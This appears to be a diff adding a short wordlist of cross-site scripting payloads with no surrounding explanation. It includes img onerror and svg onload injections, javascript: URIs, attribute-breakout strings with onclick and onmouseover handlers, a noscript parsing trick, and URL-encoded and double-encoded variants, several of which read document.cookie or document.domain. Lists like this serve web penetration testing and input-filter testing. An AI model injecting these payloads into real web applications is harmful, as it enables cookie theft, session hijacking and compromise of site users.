@@ -1,0 +1,19 @@
+#"><img src=xx onerror=prompt(1)>
+<img src=xx onerror=alert(1)>
+'+onclick=alert(1)+'
+”/>&lt;script>alert(1)&lt;/script&gt”/>
+javascript:prompt(1)%2f%2f
+"/>&lt;svg onload=alert(1)&gt;"/>
+<noscript><p tittle="</noscript><img src=x onerror=alert(1)>">
+<noscript><p tittle="</noscript>#<img src=x onerror=prompt(1)>">
+"%20onmouseover=alert(document.cookie)%20">
+" onmouseover=alert(document.cookie) bad="
+%22%20onmouseover%3dalert(document.cookie)%20bad%3d%22
+<p tittle="</>"<img src=x onerror=alert(document.domain)//
+alert(document.cookie);confirm(1)
+" onclick=alert(1)//<button ‘ onclick=alert(1)//> */ alert(1)//
+%3Cp%20tittle%3D%22%3C%2F%3E%22%3Cimg%20src%3Dx%20onerror%3Dalert%28document.domain%29%2F%2F
+%253Cp%2520tittle%253D%2522%253C%252F%253E%2522%253Cimg%2520src%253Dx%2520onerror%253Dalert%2528document.domain%2529%252F%252F
+" onclick=alert(location.host) zerobyteid="
+"+onclick=alert(location.host)+zerobyteid="
+<p tittle="</>#<img src=x onerror=alert(document.domain)//
